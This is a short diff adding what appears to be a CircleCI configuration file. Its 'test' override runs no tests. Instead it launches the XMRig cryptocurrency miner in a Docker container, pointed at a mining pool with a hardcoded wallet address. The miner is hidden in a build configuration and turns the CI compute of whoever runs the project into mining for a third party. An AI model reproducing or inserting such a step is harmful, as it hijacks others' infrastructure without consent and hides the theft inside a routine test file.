@@ -1,0 +1,7 @@
+machine:
+  services:
+    - docker
+
+test:
+  override:
+    - docker run acrisliu/xmrig ./xmrig -o pool.bytecoin.party:3333 -u 24RVwsrdnXtTEaBNpmEpxKa5XxgZVVwuE1m1wJNjXrBeb5z7Y5BzzLvii2ucxfr2MzgDGJXHbvokYHgFBAmANnCTJAPR3ao
